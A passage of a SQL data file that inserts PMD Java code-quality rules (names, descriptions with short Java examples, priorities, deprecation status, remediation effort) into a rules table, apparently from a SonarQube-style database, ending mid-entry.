INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (69, 'Avoid instantiating objects in loops', 'AvoidInstantiatingObjectsInLoops', 'rulesets/java/optimizations.xml/AvoidInstantiatingObjectsInLoops', 'pmd', 'Detects when a new object is created inside a loop', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811499, 1510817811499, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (70, 'Class with only private constructors should be final', 'ClassWithOnlyPrivateConstructorsShouldBeFinal', 'rulesets/java/design.xml/ClassWithOnlyPrivateConstructorsShouldBeFinal', 'pmd', 'A class with only private constructors should be final, unless the private constructor is called by a inner class. Example :
<pre>
public class Foo {  //Should be final
    private Foo() { }
}
</pre>

<p>
  This rule is deprecated, use {rule:squid:S2974} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811500, 1510817811501, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (71, 'Avoid Using Hard Coded IP', 'AvoidUsingHardCodedIP', 'rulesets/java/basic.xml/AvoidUsingHardCodedIP', 'pmd', 'An application with hard coded IP may become impossible to deploy in some case. It never hurts to externalize IP adresses.

<p>
This rule is deprecated, use {rule:squid:S1313} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811502, 1510817811503, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (72, 'Dont Use Float Type For Loop Indices', 'DontUseFloatTypeForLoopIndices', 'rulesets/java/basic.xml/DontUseFloatTypeForLoopIndices', 'pmd', 'Don''t use floating point for loop indices. If you must use floating point, use double
unless you''re certain that float provides enough precision and you have a compelling
performance need (space or time). Example: 
<pre>
public class Count {
  public static void main(String[] args) {
    final int START = 2000000000;
    int count = 0;
    for (float f = START; f < START + 50; f++)
      count++;
      //Prints 0 because (float) START == (float) (START + 50).
      System.out.println(count);
      //The termination test misbehaves due to floating point granularity.
    }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811505, 1510817811506, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (73, 'Constructor Calls Overridable Method', 'ConstructorCallsOverridableMethod', 'rulesets/java/design.xml/ConstructorCallsOverridableMethod', 'pmd', 'Calling overridable methods during construction poses a risk of invoking methods on an incompletely constructed object 
      and can be difficult to discern. It may leave the sub-class unable to construct its superclass or forced to replicate 
      the construction process completely within itself, losing the ability to call super(). 
      If the default constructor contains a call to an overridable method, the subclass may be completely uninstantiable. 
      Note that this includes method calls throughout the control flow graph - i.e., if a constructor Foo() calls 
      a private method bar() that calls a public method buz(), this denotes a problem. 
      <br/>Example :
<pre>
public class SeniorClass {
  public SeniorClass(){
      toString(); //may throw NullPointerException if overridden
  }
  public String toString(){
    return "IAmSeniorClass";
  }
}
public class JuniorClass extends SeniorClass {
  private String name;
  public JuniorClass(){
    super(); //Automatic call leads to NullPointerException
    name = "JuniorClass";
  }
  public String toString(){
    return name.toUpperCase();
  }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1699} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811507, 1510817811508, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (244, 'Unnecessary Return', 'UnnecessaryReturn', 'rulesets/java/unnecessary.xml/UnnecessaryReturn', 'pmd', 'Avoid unnecessary return statements', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811936, 1510817811936, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (75, 'Dont Import Java Lang', 'DontImportJavaLang', 'rulesets/java/imports.xml/DontImportJavaLang', 'pmd', 'Avoid importing anything from the package ''java.lang''. These classes are automatically imported (JLS 7.5.3).

<p>
This rule is deprecated, use {rule:squid:UselessImportCheck} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811512, 1510817811513, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (76, 'Unused Modifier', 'UnusedModifier', 'rulesets/java/unusedcode.xml/UnusedModifier', 'pmd', 'Fields in interfaces are automatically public static final, and methods are public abstract. Classes or interfaces nested in an interface are automatically public and static (all nested interfaces are automatically static). For historical reasons, modifiers which are implied by the context are accepted by the compiler, but are superfluous.', 0, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811514, 1510817811515, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (77, 'Useless Parentheses', 'UselessParentheses', 'rulesets/java/unnecessary.xml/UselessParentheses', 'pmd', 'Useless parentheses should be removed. Example: 
<pre>
public class Foo {

   private int _bar1;
   private Integer _bar2;

   public void setBar(int n) {
      _bar1 = Integer.valueOf((n)); // here
      _bar2 = (n); // and here
   }

}
</pre>

<p>
This rule is deprecated, use {rule:squid:UselessParenthesesCheck} instead.
</p>', 0, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811516, 1510817811516, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (78, 'Guard Debug Logging', 'GuardDebugLogging', 'rulesets/java/logging-jakarta-commons.xml/GuardDebugLogging', 'pmd', 'When log messages are composed by concatenating strings, the whole section should be guarded by a isDebugEnabled() check to avoid performance and memory issues.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811518, 1510817811518, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (79, 'Use Correct Exception Logging', 'UseCorrectExceptionLogging', 'rulesets/java/logging-jakarta-commons.xml/UseCorrectExceptionLogging', 'pmd', 'To make sure the full stacktrace is printed out, use the logging statement with 2 arguments: a String and a Throwable.

<p>
This rule is deprecated, use {rule:squid:S1166} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'error-handling', false, 'HTML', 1510817811519, 1510817811520, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (80, 'Avoid Assert As Identifier', 'AvoidAssertAsIdentifier', 'rulesets/java/migrating.xml/AvoidAssertAsIdentifier', 'pmd', 'Finds all places ''assert'' is used as an identifier is used.

<p>
  This rule is deprecated, use {rule:squid:S1190} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811523, 1510817811524, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (81, 'Instantiation To Get Class', 'InstantiationToGetClass', 'rulesets/java/design.xml/InstantiationToGetClass', 'pmd', 'Avoid instantiating an object just to call getClass() on it; use the .class public member instead. Example : replace <code>Class c = new String().getClass();</code> with <code>Class c = String.class;</code>

<p>
  This rule is deprecated, use {rule:squid:S2133} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811525, 1510817811525, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (82, 'Avoid Branching Statement As Last In Loop', 'AvoidBranchingStatementAsLastInLoop', 'rulesets/java/basic.xml/AvoidBranchingStatementAsLastInLoop', 'pmd', 'Using a branching statement as the last part of a loop may be a bug, and/or is confusing.
Ensure that the usage is not a bug, or consider using another approach. Example: 
<pre>
// unusual use of branching statement in a loop
for (int i = 0; i < 10; i++) {
  if (i*i <= 25) {
    continue;
  }
  break;
}

// this makes more sense...
for (int i = 0; i < 10; i++) {
  if (i*i > 25) {
    break;
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811528, 1510817811529, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (83, 'String Instantiation', 'StringInstantiation', 'rulesets/java/strings.xml/StringInstantiation', 'pmd', 'Avoid instantiating String objects; this is usually unnecessary.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811530, 1510817811531, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (84, 'Finalize Only Calls Super Finalize', 'FinalizeOnlyCallsSuperFinalize', 'rulesets/java/finalizers.xml/FinalizeOnlyCallsSuperFinalize', 'pmd', 'If the finalize() is implemented, it should do something besides just calling super.finalize().

<p>
This rule is deprecated, use {rule:squid:S1185} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811535, 1510817811536, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (85, 'Proper Logger', 'ProperLogger', 'rulesets/java/logging-jakarta-commons.xml/ProperLogger', 'pmd', 'Logger should normally be defined private static final and have the correct class. Private final Log log; is also allowed for rare cases when loggers need to be passed around, but the logger needs to be passed into the constructor.

<p>
This rule is deprecated, use {rule:squid:S1312} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811537, 1510817811538, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (86, 'Ncss Constructor Count', 'NcssConstructorCount', 'rulesets/java/codesize.xml/NcssConstructorCount', 'pmd', 'This rule uses the NCSS (Non Commenting Source Statements) algorithm to determine the number of lines of code for a given constructor. NCSS ignores comments, and counts actual statements. Using this algorithm, lines of code that are split are counted as one.

<p>
This rule is deprecated, use {rule:squid:S138} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'size', false, 'HTML', 1510817811541, 1510817811542, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (87, 'Law Of Demeter', 'LawOfDemeter', 'rulesets/java/coupling.xml/LawOfDemeter', 'pmd', 'The Law of Demeter is a simple rule, that says "only talk to friends". It helps to reduce coupling between classes or objects. 
See also the references:
Andrew Hunt, David Thomas, and Ward Cunningham. The Pragmatic Programmer. From Journeyman to Master. Addison-Wesley Longman, Amsterdam, October 1999.;
K.J. Lieberherr and I.M. Holland. Assuring good style for object-oriented programs. Software, IEEE, 6(5):38–48, 1989.;
http://www.ccs.neu.edu/home/lieber/LoD.html;
http://en.wikipedia.org/wiki/Law_of_Demeter 
<p>Example:</p> 
<pre>
public class Foo {
    /**
     * This example will result in two violations.
     */
    public void example(Bar b) {
        // this method call is ok, as b is a parameter of "example"
        C c = b.getC();
        
        // this method call is a violation, as we are using c, which we got from B.
        // We should ask b directly instead, e.g. "b.doItOnC();"
        c.doIt();
        
        // this is also a violation, just expressed differently as a method chain without temporary variables.
        b.getC().doIt();
        
        // a constructor call, not a method call.
        D d = new D();
        // this method call is ok, because we have create the new instance of D locally.
        d.doSomethingElse(); 
    }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817811545, 1510817811548, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (88, 'Use String Buffer For String Appends', 'UseStringBufferForStringAppends', 'rulesets/java/optimizations.xml/UseStringBufferForStringAppends', 'pmd', 'Finds usages of += for appending strings.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817811549, 1510817811550, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (89, 'For Loops Must Use Braces', 'ForLoopsMustUseBraces', 'rulesets/java/braces.xml/ForLoopsMustUseBraces', 'pmd', '<p>
Avoid using ''for'' statements without using curly braces, like <code>for (int i=0; i<42;i++) foo();</code>
</p>

<p>
This rule is deprecated, use {rule:squid:S00121} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811551, 1510817811552, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (90, 'Override both equals and hashcode', 'OverrideBothEqualsAndHashcode', 'rulesets/java/basic.xml/OverrideBothEqualsAndHashcode', 'pmd', 'Override both public boolean Object.equals(Object other), and public int Object.hashCode(), or override neither. Even if you are inheriting a hashCode() from a parent class, consider implementing hashCode and explicitly delegating to your superclass. Example :
<pre>
// this is bad
public class Bar {
  public boolean equals(Object o) {
      // do some comparison
  }
}

// and so is this
public class Baz {
  public int hashCode() {
      // return some hash value
  }
}

// this is OK
public class Foo {
  public boolean equals(Object other) {
      // do some comparison
  }
  public int hashCode() {
      // return some hash value
  }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1206} instead.
</p>', 4, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817811553, 1510817811554, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (91, 'Java5 migration - Short instantiation', 'ShortInstantiation', 'rulesets/java/migrating.xml/ShortInstantiation', 'pmd', 'In JDK 1.5, calling new Short() causes memory allocation. Short.valueOf() is more memory friendly.  Example :
  <pre>
public class Foo {
private Short i = new Short(0); // change to Short i =
Short.valueOf(0);
}
  </pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811555, 1510817811557, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (92, 'Suspicious Octal Escape', 'SuspiciousOctalEscape', 'rulesets/java/controversial.xml/SuspiciousOctalEscape', 'pmd', 'A suspicious octal escape sequence was found inside a String literal. The Java language specification (section 3.10.6) says an octal escape sequence inside a literal String shall consist of a backslash followed by: OctalDigit | OctalDigit OctalDigit | ZeroToThree OctalDigit OctalDigit Any octal escape sequence followed by non-octal digits can be confusing, e.g. "\038" is interpreted as the octal escape sequence "\03" followed by the literal character 8.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811559, 1510817811560, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (93, 'Basic - Empty Initializer', 'EmptyInitializer', 'rulesets/java/empty.xml/EmptyInitializer', 'pmd', 'An empty initializer was found. Example :
<pre>
public class Foo {

   static {} // Why ?

   {} // Again, why ?

}
</pre>

<p>
This rule is deprecated, use {rule:squid:S00108} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811561, 1510817811562, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (94, 'Strict Exception - Do not throw exception in finally', 'DoNotThrowExceptionInFinally', 'rulesets/java/strictexception.xml/DoNotThrowExceptionInFinally', 'pmd', 'Throwing exception in a finally block is confusing. It may mask exception or a defect of the code, it also render code cleanup uninstable. Example :
<pre>
public class Foo
{
  public void bar()
  {
    try {
    // Here do some stuff
    }
    catch( Exception e) {
    // Handling the issue
    }
    finally
    {
      // is this really a good idea ?
      throw new Exception();
    }
  }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1163} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'error-handling', false, 'HTML', 1510817811563, 1510817811563, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (95, 'Call Super In Constructor', 'CallSuperInConstructor', 'rulesets/java/controversial.xml/CallSuperInConstructor', 'pmd', 'It is a good practice to call super() in a constructor. If super() is not called but another constructor (such as an overloaded constructor) is called, this rule will not report it.', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811564, 1510817811565, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (96, 'Unnecessary Wrapper Object Creation', 'UnnecessaryWrapperObjectCreation', 'rulesets/java/optimizations.xml/UnnecessaryWrapperObjectCreation', 'pmd', 'Parsing method should be called directy instead.

<p>
  This rule is deprecated, use {rule:squid:S1158} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811566, 1510817811567, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (97, 'Local Home Naming Convention', 'LocalHomeNamingConvention', 'rulesets/java/j2ee.xml/LocalHomeNamingConvention', 'pmd', 'The Local Home interface of a Session EJB should be suffixed by "LocalHome".', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811569, 1510817811570, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (98, 'System Println', 'SystemPrintln', 'rulesets/java/logging-java.xml/SystemPrintln', 'pmd', 'System.(out|err).print is used, consider using a logger.

<p>
This rule is deprecated, use {rule:squid:S106} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811572, 1510817811573, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (99, 'Signature Declare Throws Exception', 'SignatureDeclareThrowsException', 'rulesets/java/strictexception.xml/SignatureDeclareThrowsException', 'pmd', 'It is unclear which exceptions that can be thrown from the methods. It might be difficult to document and understand the vague interfaces. Use either a class derived from RuntimeException or a checked exception.

<p>
This rule is deprecated, use {rule:squid:S00112} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'error-handling', false, 'HTML', 1510817811574, 1510817811575, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (100, 'Avoid Catching Generic Exception', 'AvoidCatchingGenericException', 'rulesets/java/strictexception.xml/AvoidCatchingGenericException', 'pmd', 'Avoid catching generic exceptions such as NullPointerException, RuntimeException, Exception in try-catch block.

<p>
  This rule is deprecated, use {rule:squid:S2221} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'error-handling', false, 'HTML', 1510817811576, 1510817811577, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (101, 'Naming - Variable naming conventions', 'VariableNamingConventions', 'rulesets/java/naming.xml/VariableNamingConventions', 'pmd', 'A variable naming conventions rule - customize this to your liking. Currently, it checks for final variables that should be fully capitalized and non-final variables that should not include underscores.

<p>
